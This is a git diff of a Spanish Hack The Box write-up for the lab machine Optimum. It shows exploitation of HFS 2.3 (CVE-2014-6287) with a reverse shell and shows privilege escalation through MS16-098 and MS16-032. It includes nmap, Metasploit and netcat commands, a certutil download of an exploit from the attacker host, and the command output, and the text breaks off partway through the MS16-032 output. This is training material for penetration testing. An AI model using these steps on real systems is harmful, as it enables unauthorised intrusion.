@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Optimum - Hack The Box
-excerpt: "La máquina Optimum, bastante sencilla con muchas formas para poder vulnerarla, en mi caso use el CVE-2014-6287 para poder acceder a la máquina como usuario y aunque intente probar otro Exploit (MS16-032) para escalar privilegios como Root, no funciono, hay más por probar pues el que si sirvió fue el MS16-098."
+excerpt: "La máquina Optimum, bastante sencilla con algunas formas para poder vulnerarla, en mi caso use el CVE-2014-6287 para poder acceder a la máquina como usuario, y para escalar privilegios, utilice el Exploit MS16-032 y MS16-098."
 date: 2023-02-16
 classes: wide
 header:
@@ -16,13 +16,25 @@ tags:
   - Http File Server (HFS)
   - Remote Command Execution (RCE)
   - RCE - CVE-2014-6287
-  - Windows Exploit Suggester
+  - System Recognition (Windows)
   - Local Privilege Escalation (LPE)
   - LPE - MS16-098
+  - LPE - MS16-032
   - OSCP Style
+  - Metasploit Framework
 ---
 ![](/assets/images/htb-writeup-optimum/optimum_logo.png)
-La máquina Optimum, bastante sencilla con muchas formas para poder vulnerarla, en mi caso use el **CVE-2014-6287** para poder acceder a la máquina como usuario y aunque intente probar otro exploit **(MS16-032)** para escalar privilegios como **Root**, no funciono, hay más por probar pues el que si sirvió fue el **MS16-098**.
+La máquina Optimum, bastante sencilla con algunas formas para poder vulnerarla, en mi caso use el **CVE-2014-6287** para poder acceder a la máquina como usuario, y para escalar privilegios, utilice el **Exploit MS16-032** y **MS16-098**.
+
+Herramientas utilizadas:
+* *nmap*
+* *whatweb*
+* *nc*
+* *python2*
+* *certutil.exe*
+* *python3*
+* *windows-exploit-suggester.py*
+* *metasploit framework*
 
 
 <br>
@@ -38,16 +50,23 @@ La máquina Optimum, bastante sencilla con muchas formas para poder vulnerarla, 
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
 				<li><a href="#Exploit">Buscando un Exploit</a></li>
 				<ul>
                                         <li><a href="#PruebaExp">Probando Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)</a></li>
+					<li><a href="#PruebaExp2">Probando Exploit: Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)</a></li>
                                 </ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
+		<ul>
+			<li><a href="#PostEnum">Enumeración de Máquina</a></li>
+			<li><a href="#PruebaExp3">Probando Exploit: Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow (MS16-098)</a></li>
+			<li><a href="#PostEnum2">Enumeración de Máquina con Metasploit Framework</a></li>
+			<li><a href="#PruebaExp4">Probando Exploit: Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell)</a></li>
+		</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
 </div>
@@ -68,7 +87,7 @@ La máquina Optimum, bastante sencilla con muchas formas para poder vulnerarla, 
 <h2 id="Ping">Traza ICMP</h2>
 
 Realicemos un ping para saber si la máquina está conectada y analizaremos el TTL para saber que SO opera en dicha máquina.
-```
+```bash
 ping -c 4 10.10.10.8       
 PING 10.10.10.8 (10.10.10.8) 56(84) bytes of data.
 64 bytes from 10.10.10.8: icmp_seq=1 ttl=127 time=137 ms
@@ -84,7 +103,7 @@ Gracias al TTL sabemos que la máquina usa Windows. Realicemos los escaneos de p
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
 
-```
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.8 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 13:28 CST
@@ -104,20 +123,23 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 27.03 seconds
            Raw packets sent: 131086 (5.768MB) | Rcvd: 23 (1.012KB)
 ```
-* -p-: Para indicarle un escaneo en ciertos puertos.
-* --open: Para indicar que aplique el escaneo en los puertos abiertos.
-* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
-* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-* -Pn: Para indicar que se omita el descubrimiento de hosts.
-* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-Al parecer, solamente hay un puerto abierto y es el de HTTP. En vez de realizar un escaneo de servicios podríamos usar **whatweb** para saber más sobre dicho puerto pero hagámoslo namas por costumbre.
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
+
+Al parecer, solamente hay un puerto abierto y es del **servicio HTTP**. Ahora, veamos a que nos enfrentamos con un escaneo de servicios.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
-```
+```bash
 nmap -sC -sV -p80 10.10.10.8 -oN targeted                                            
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 13:31 CST
 Nmap scan report for 10.10.10.8
@@ -132,17 +154,15 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
-* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
-* -p: Para indicar puertos específicos.
-* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Muy bien, podemos ver la versión de HTTP que usan, pero igual usemos **whatweb** para ver que nos dice:
-```
-whatweb http://10.10.10.8/                                                                                              
-http://10.10.10.8/ [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
-```
-Pues prácticamente lo mismo. Es momento de analizar el puerto HTTP.
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
+
+Esta usando el servicio HFS, vamos a investigarlo y de paso, analicemos la página web.
 
 
 <br>
@@ -157,30 +177,40 @@ Pues prácticamente lo mismo. Es momento de analizar el puerto HTTP.
 <br>
 
 
-<h2 id="HTTP">Analizando Puerto 80</h2>
+<h2 id="HTTP">Analizando Servicio HTTP</h2>
+
+Primero, investiguemos el servicio:
+
+| **HTTP File Server** |
+|:-----------:|
+| *También conocido como HFS, es un servidor web gratuito diseñado específicamente para publicar y compartir archivos. Puedes utilizar HFS para enviar y recibir archivos, pues permite acceder a los archivos de su teléfono desde una computadora de escritorio, tableta u otros dispositivos sin ningún software especial, solo un navegador web. Se diferencia del intercambio de archivos clásico porque utiliza tecnología web para ser más compatible con la Internet actual.* |
+
+<br>
+
+Muy bien, usemos **whatweb** para ver que nos dice:
+```bash
+whatweb http://10.10.10.8/                                                                                              
+http://10.10.10.8/ [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
+```
+No nos da mucha información que nos sea util.
 
 Vamos a entrar a ver que show:
 
 ![](/assets/images/htb-writeup-optimum/Captura1.png)
 
-Mmmmm no había visto algo parecido, pareciera como si ya estuviéramos dentro pero no, si nos vamos al login nos pedirá credenciales que obviamente no tenemos:
+Nos muestra varias herramientas que se pueden utilizar, si nos vamos al login nos pedirá credenciales que obviamente no tenemos:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-optimum/Captura2.png">
 </p>
 
-¿Se podrá subir archivos? Al parecer no todavía, ahí mismo nos aparece la información del servidor que ya nos dio el escaneo de servicios y **whatweb**:
+Ahí mismo nos aparece la información del servidor que ya nos dio el escaneo de servicios y la **herramienta whatweb**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-optimum/Captura3.png">
 </p>
 
-Vamos a investigar que es este servicio:
-**HTTP File Server es una herramienta simple que le permite acceder a los archivos de su teléfono desde una computadora de escritorio, tableta u otros dispositivos sin ningún software especial, solo un navegador web.**
-
-**HTTP File Server muestra los archivos compartidos en una sencilla página HTML, en la que se incluye el nombre de cada archivo y su tamaño.**
-
-Entonces el servicio que está operando, es el **HFS 2.3**. Es momento de buscar un Exploit.
+Afortunadamente, ya tenemos la versión que se esta ocupando y es la versión **HFS 2.3**. Es momento de buscar un Exploit.
 
 
 <br>
@@ -197,7 +227,7 @@ Entonces el servicio que está operando, es el **HFS 2.3**. Es momento de buscar
 
 <h2 id="Exploit">Buscando un Exploit</h2>
 
-```
+```bash
 searchsploit HFS 2.3                 
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                             |  Path
@@ -213,25 +243,22 @@ Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution        
 Shellcodes: No Results
 Papers: No Results
 ```
-Ufff, hay varios que podemos probar y que justo son RCE, empecemos con los **.py** primero:
+Hay varios que podemos probar y que justo son RCE, empecemos con el Exploit en **Python** primero.
+
+<br>
 
 <h3 id="PruebaExp">Probando Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)</h3>
 
-```
-searchsploit -x windows/remote/39161.py
-  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
-      URL: https://www.exploit-db.com/exploits/39161
-     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
-    Codes: CVE-2014-6287, OSVDB-111386
- Verified: True
-File Type: Python script, ASCII text executable, with very long lines (540)
-```
-Ok, el Exploit nos dice algo importante:
+Si revisamos el Exploit, observa que nos dice algo importante:
 
-**Debe estar utilizando un servidor web que aloje netcat (http://attackers_ip:80/nc.exe) y ¡Es posible que deba ejecutarlo varias veces para tener éxito!**
+| *Traducción* |
+|:-----------:|
+| *Debe estar utilizando un servidor web que aloje netcat (http://attackers_ip:80/nc.exe) y ¡Es posible que deba ejecutarlo varias veces para tener éxito!* |
 
-Entonces debemos subir una netcat como con otras máquinas para que este Exploit pueda funcionar. Vamos a copiar el Exploit antes que nada:
-```
+<br>
+
+Entonces, debemos alzar un servidor web que contenga una **netcat**, como con otras máquinas, para que este Exploit descargue dicha **netcat** en el **servicio HFS**, y supongo que si lo ejecutamos otra o varias veces, hara que se ejecute la **netcat** y nos conecte. Vamos a copiar el Exploit y lo modificaremos:
+```bash
 searchsploit -m windows/remote/39161.py
   Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
       URL: https://www.exploit-db.com/exploits/39161
@@ -240,41 +267,48 @@ searchsploit -m windows/remote/39161.py
  Verified: True
 File Type: Python script, ASCII text executable, with very long lines (540)
 ```
+
 Ahora sí, hagámoslo por pasos:
 
-* Para empezar, busquemos la netcat, si tienes Kali ya sabrás como:
-```
+* Para empezar, busquemos la **netcat** en Kali:
+```bash
 locate nc.exe
 /usr/share/seclists/Web-Shells/FuzzDB/nc.exe
 /usr/share/windows-resources/binaries/nc.exe
 ```
+
 * Copiamos la de binarios:
-```
+```bash
 cp /usr/share/windows-resources/binaries/nc.exe .
 ls           
 allPorts  HFS_Exploit.py  nc.exe  targeted
 ```
+
 * Antes de levantar el servidor para cargar la netcat, hay que cambiar estas dos variables del Exploit:
-```
+```python
 	ip_addr = "Tu_IP" #local IP address
         local_port = "443" # Local Port number
 ```
+
 * Ahora sí, activamos el servidor:
-```
+```bash
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
+
 * Activamos una netcat con el puerto que pusimos:
-```
+```bash
 nc -nvlp 443                       
 listening on [any] 443 ...
 ```
+
 * Y lanzamos el Exploit, como bien menciona hay que activarlo varias veces, en mi caso funciono a la segunda:
-```
+```bash
 python2 HFS_Exploit.py 10.10.10.8 80
 ```
+
 * Listo, ya estamos dentro:
-```
+```bash
 nc -nvlp 443                       
 listening on [any] 443 ...
 connect to [10.10.14.12] from (UNKNOWN) [10.10.10.8] 49162
@@ -284,8 +318,9 @@ C:\Users\kostas\Desktop>whoami
 whoami
 optimum\kostas
 ```
+
 * Justamente entramos como un usuario y en su escritorio, entonces ahí mismo está la flag del usuario:
-```
+```bash
 C:\Users\kostas\Desktop>dir
 dir
  Volume in drive C has no label.
@@ -301,9 +336,130 @@ C:\Users\kostas\Desktop>type user.txt
 type user.txt
 34cbd67f90f2fa85416b39f6fb55cfbc
 ```
+Excelente, ahora vamos a probar la versión con **Metasploit Framework**.
 
-¿Ahora que hacemos? Bueno, veamos que permisos tenemos y quizá con eso podamos convertirnos en Root o en este caso como NT Authority System.
+<br>
+
+<h3 id="PruebaExp2">Probando Exploit: Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)</h3>
+
+Vamos a iniciar la herramientas **Metasploit Framework**, buscaremos los Exploits para el **servicio HFS 2.3** y usaremos el Exploit que quede para esta máquina.
+
+Hagamoslo por pasos:
+
+* Iniciando Metasploit:
+
+```bash
+msfconsole
+.
+ ______________________________________
+/ it looks like you're trying to run a \                                                                                                                                                                                                   
+\ module                               /                                                                                                                                                                                                   
+ --------------------------------------                                                                                                                                                                                                    
+ \                                                                                                                                                                                                                                         
+  \                                                                                                                                                                                                                                        
+     __                                                                                                                                                                                                                                    
+    /  \                                                                                                                                                                                                                                   
+    |  |                                                                                                                                                                                                                                   
+    @  @                                                                                                                                                                                                                                   
+    |  |                                                                                                                                                                                                                                   
+    || |/                                                                                                                                                                                                                                  
+    || ||                                                                                                                                                                                                                                  
+    |\_/|                                                                                                                                                                                                                                  
+    \___/                                                                                                                                                                                                                                  
+.                                                                                                                                                                                                                                           
+.
+       =[ metasploit v6.3.4-dev                           ]
++ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+.
+Metasploit tip: Save the current environment with the 
+save command, future console restarts will use this 
+environment again
+Metasploit Documentation: https://docs.metasploit.com/
 ```
+
+* Buscando y usando un Exploit:
+
+```bash
+msf6 > search hfs 2.3
+.
+Matching Modules
+================
+.
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
+   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+.
+.
+Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/rejetto_hfs_exec
+.
+msf6 > use exploit/windows/http/rejetto_hfs_exec
+*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/http/rejetto_hfs_exec) >
+```
+
+* Configurando Exploit:
+```bash
+msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
+RHOSTS => 10.10.10.8
+msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST Tu_IP
+LHOST => Tu_IP
+```
+
+* Iniciando Exploit:
+```bash
+msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
+.
+[*] Started reverse TCP handler on Tu_IP:4444 
+[*] Using URL: http://10.10.14.35:8080/SUxJCT
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /SUxJCT
+[*] Sending stage (175686 bytes) to 10.10.10.8
+[!] Tried to delete %TEMP%\xiIhUkZlpFlSwI.vbs, unknown result
+[*] Meterpreter session 1 opened (Tu_IP:4444 -> 10.10.10.8:49162)
+[*] Server stopped.
+.
+meterpreter > sysinfo
+Computer        : OPTIMUM
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : el_GR
+Domain          : HTB
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > shell
+Process 460 created.
+Channel 2 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+.
+C:\Users\kostas\Desktop>whoami
+whoami
+optimum\kostas
+```
+
+Esta fue una forma muy sencilla para ganar acceso a la máquina.
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Post" style="text-align:center;">Post Explotación</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="PostEnum">Enumeración de Máquina</h2>
+
+Veamos que permisos tenemos y quizá con eso podamos convertirnos en Root o en este caso como **NT Authority System**.
+```shell
 C:\Users\kostas\Desktop>whoami /priv
 whoami /priv
 
@@ -315,8 +471,9 @@ Privilege Name                Description                    State
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
+
 No estoy del todo seguro de que podamos aprovecharnos de ese privilegio, así que mejor veamos que version de Windows corre la máquina:
-```
+```shell
 C:\Users\kostas\Desktop>systeminfo 
 systeminfo
 
@@ -333,8 +490,7 @@ La máquina usa **Windows 2012 6.3.9600 N/A Build 9600**, busquemos un Exploit p
 La herramienta **Windows Exploit Suggester** nos va a ayudar a encontrar los Exploits a los que es vulnerable la máquina, únicamente debemos pasarle un fichero que almacene toda la información que nos dé el comando **systeminfo** de la máquina víctima, primero vamos a descargar esta herramienta:
 
 * https://github.com/AonCyberLabs/Windows-Exploit-Suggester
-
-```
+```bash
 git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
 Clonando en 'Windows-Exploit-Suggester'...
 remote: Enumerating objects: 120, done.
@@ -344,8 +500,9 @@ remote: Total 120 (delta 58), reused 54 (delta 54), pack-reused 53
 Recibiendo objetos: 100% (120/120), 156.83 KiB | 1.15 MiB/s, listo.
 Resolviendo deltas: 100% (74/74), listo.
 ```
-Una vez descargada solamente seguimos las instrucciones del GitHub o si no te funciona, hazle como yo:
-```
+
+Una vez descargada, solamente seguimos las instrucciones del GitHub o si no te funciona, hazle como yo:
+```bash
 python2 windows-exploit-suggester.py --update
 [*] initiating winsploit version 3.3...
 [+] writing to file 2023-03-30-mssb.xls
@@ -354,13 +511,15 @@ python2 windows-exploit-suggester.py --update
 Al hacer esto, nos da un archivo que necesitaremos usar junto al archivo donde está la información del sistema, de hecho, ahí te dice que se creó un archivo: **writing to file 2023-03-30-mssb.xls**
 
 Vamos a copiar toda la información que nos dio el comando **systeminfo** y la guardaremos en un fichero con el mismo nombre o uno similar:
-```
+```bash
 nano sysinfo.txt
 ls                                           
 2023-03-30-mssb.xls  LICENSE.md  README.md  sysinfo.txt  windows-exploit-suggester.py
 ```
-Corremos el **suggester** y nos saldran varios Exploits para esta máquina. IMPORTANTE, a la primera no me sirvió, por lo que tuve que instalar otra cosa:
-```
+Corremos el **suggester** y nos saldran varios Exploits para esta máquina. 
+
+IMPORTANTE, a la primera no me sirvió, por lo que tuve que instalar otra cosa:
+```bash
 pip2 install xlrd==1.2.0
 ```
 Aquí viene ese problema:
@@ -368,7 +527,8 @@ Aquí viene ese problema:
 * https://www.reddit.com/r/learnpython/comments/ft0h3p/windowsexploitsuggester_error/
 
 Ahora sí, usemos el **suggester**:
-```
+
+```shell
 python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
 [*] initiating winsploit version 3.3...
 [*] database file detected as xls or xlsx based on extension
@@ -383,22 +543,12 @@ python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.t
 [E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
 ...
 ```
-Puedes intentar probar con varios, yo en especial voy a probar con el **MS16-098** porque intente probar el **MS16-032** pero no me funciono, casi 3 horas perdidas ahí jeje.
+Puedes intentar probar con varios, yo en especial voy a probar con el **MS16-098** porque intente probar el **MS16-032** pero no me funciono, luego veremos si se puede usar en el **Metasploit Framework**.
 
+<h2 id="PruebaExp3">Probando Exploit: Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow (MS16-098)</h2>
 
-<br>
-<br>
-<hr>
-<div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
-</div>
-<br>
-
-
-```
+Busquemos el Exploit:
+```bash
 searchsploit MS16-098                  
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                             |  Path
@@ -409,34 +559,27 @@ Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098) (2)            
 Shellcodes: No Results
 Papers: No Results
 ```
-El Exploit esta hecho en C, si analizamos el contenido del Exploit, arriba vienen adjuntos dos links, uno con información y otro con el que podremos descargar un ejecutable de dicho Exploit, descárgalo.
+El Exploit esta hecho en **C**. Si analizamos el contenido del Exploit, arriba vienen adjuntos dos links, uno con información sobre este Exploit y otro con el que podremos descargar un ejecutable de dicho Exploit, descárgalo.
 
-Después de descárgarlo, vamos a meterlo a la máquina, para esto usaremos un programa llamado **certutil.exe**, dicho programa está en todos los Windows y con este podemos descargar directamente cualquier cosa. Investiguemos sobre **certutil**.
+Después de descárgarlo, vamos a meterlo a la máquina, para esto usaremos **certutil.exe** como en otras máquinas con Windows.
 
-**Una de las características de CertUtil es la capacidad de descargar un certificado, o cualquier otro archivo para ese asunto, desde una URL remota y guardarlo como un archivo local usando la sintaxis "certutil.exe -urlcache -split -f [URL] output.file".** 
-
-Aquí un link con esta información:
-
-* https://tecnonucleous.com/2018/04/05/certutil-exe-podria-permitir-que-los-atacantes-descarguen-malware-mientras-pasan-por-alto-el-antivirus/
-
-Entonces vamos a usar el siguiente comando dentro de la máquina:
-```
-certutil.exe -urlcache -split -f [URL] nombre_con_el_que_se_guardara
-```
 Muy bien, hagámoslo por pasos:
+
 * Levantamos un servidor con Python en donde este el Exploit ejecutable:
-```
+```bash
 python3 -m http.server                                                            
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-* Nos metemos a la carpeta /Temp y creamos un directorio, lo llamaremos **privesc**:
-```
+
+* Nos metemos a la **directorio /Temp** y creamos un directorio nuevo, lo llamaremos **privesc**:
+```shell
 C:\Users\kostas\Desktop>cd C:\Windows/Temp
 mkdir Privesc
 cd Privesc
 ```
-* Y dentro de la máquina usamos el siguiente comando de **certutil.exe**:
-```
+
+* Y dentro de la máquina usamos la **herramienta certutil.exe**:
+```shell
 C:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://10.10.14.12:8000/Exploit.exe Exploit.exe
 certutil.exe -urlcache -split -f http://10.10.14.12:8000/Exploit.exe Exploit.exe
 ****  Online  ****
@@ -444,8 +587,9 @@ certutil.exe -urlcache -split -f http://10.10.14.12:8000/Exploit.exe Exploit.exe
   088c00
 CertUtil: -URLCache command completed successfully.
 ```
-* Verificamos si está el Exploit, aunque igual se puede ver en el servidor que activamos:
-```
+
+* Verificamos si está el Exploit:
+```shell
 C:\Windows\Temp\Privesc>dir
 dir
  Volume in drive C has no label.
@@ -457,8 +601,9 @@ dir
                1 File(s)        560.128 bytes
                2 Dir(s)   5.652.480.000 bytes free
 ```
+
 * Y lo activamos:
-```
+```shell
 C:\Windows\Temp\Privesc>Exploit.exe
 Exploit.exe
 Microsoft Windows [Version 6.3.9600]
@@ -467,7 +612,170 @@ C:\Windows\Temp\Privesc>whoami
 whoami
 nt authority\system
 ```
-¡LISTO!, ya entramos, solamente busca la flag en el directorio **Administrator**.
+
+¡LISTO!, ya entramos, solamente busca la flag en el directorio Administrator. Ahora, veamos como sería aplicar la enumeración de la máquina y la escalada de privilegios en **Metasploit**.
+
+<h2 id="PostEnum2">Enumeración de Máquina con Metasploit Framework</h2>
+
+Como ya tenemos una sesión activa, vamos a utilizar el **módulo Suggester**, para que busque que Exploits pueden ser utilizados en la máquina con el fin de escalar privilegios.
+
+Vamos por pasos:
+
+* Buscando y usando **módulo Suggester**:
+
+```bash
+msf6 exploit(windows/http/rejetto_hfs_exec) > search suggester
+.
+Matching Modules
+================
+.
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+.
+.
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+.
+msf6 exploit(windows/http/rejetto_hfs_exec) > use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) >
+```
+
+* Configurando **módulo Suggester**:
+
+```bash
+msf6 post(multi/recon/local_exploit_suggester) > sessions
+.
+Active sessions
+===============
+.
+  Id  Name  Type                     Information               Connection
+  --  ----  ----                     -----------               ----------
+  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  Tu_IP:4444 -> 10.10.10.8:49162 (10.10.10.8)
+.
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+SESSION => 1
+```
+
+* Ejecutando módulo:
+
+```bash
+msf6 post(multi/recon/local_exploit_suggester) > exploit
+.
+[*] 10.10.10.8 - Collecting local exploits for x86/windows...
+[*] 10.10.10.8 - 181 exploit checks are being tried...
+[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+[*] Running check method for exploit 41 / 41
+[*] 10.10.10.8 - Valid modules for session 1:
+============================
+.
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+```
+
+Excelente, nos marca 2 Exploits, aunque nos vamos a ir por el **MS16-032** para poder escalar privilegios, pues este también lo marco el **Windows Exploit Suggester**.
+
+<h2 id="PruebaExp4">Probando Exploit: Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell)</h2>
+
+Vamos a configurar el **Exploit MS16-032**, vamos por pasos:
+
+* Usando Exploit:
+```bash
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >
+```
+
+* Configurando Exploit:
+```bash
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 1
+SESSION => 1
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST Tu_IP
+LHOST => Tu_IP
+```
+
+* Iniciando Exploit:
+
+```bash
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit
+.
+[*] Started reverse TCP handler on Tu_IP:4444 
+[+] Compressed size: 1160
+[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\uFuAbbcLlZcEA.ps1...
+[*] Compressing script contents...
+[+] Compressed size: 3747
+[*] Executing exploit script...
+         __ __ ___ ___   ___     ___ ___ ___ 
+        |  V  |  _|_  | |  _|___|   |_  |_  |
+        |     |_  |_| |_| . |___| | |_  |  _|
+        |_|_|_|___|_____|___|   |___|___|___|
+                                            
+                       [by b33f -> @FuzzySec]
+
+[?] Operating system core count: 2
+[>] Duplicating CreateProcessWithLogonW handle
+[?] Done, using thread handle: 1336
+.
+[*] Sniffing out privileged impersonation token..
+.
+[?] Thread belongs to: svchost
+[+] Thread suspended
+[>] Wiping current impersonation token
+[>] Building SYSTEM impersonation token
+[ref] cannot be applied to a variable that does not exist.
+At line:200 char:3
++         $f_tJ = [Ntdll]::NtImpersonateThread($brGHO, $brGHO, [ref]$ko)
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (ko:VariablePath) [], RuntimeException
+    + FullyQualifiedErrorId : NonExistingVariableReference
+. 
+[!] NtImpersonateThread failed, exiting..
+[+] Thread resumed!
+.
+[*] Sniffing out SYSTEM shell..
+.
+[>] Duplicating SYSTEM token
+Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateToken" to type "System.IntPtr": "Cannot co
+nvert null to type "System.IntPtr"."
+At line:259 char:2
++     $f_tJ = [Advapi32]::DuplicateToken($kZYdB, 2, [ref]$rG8)
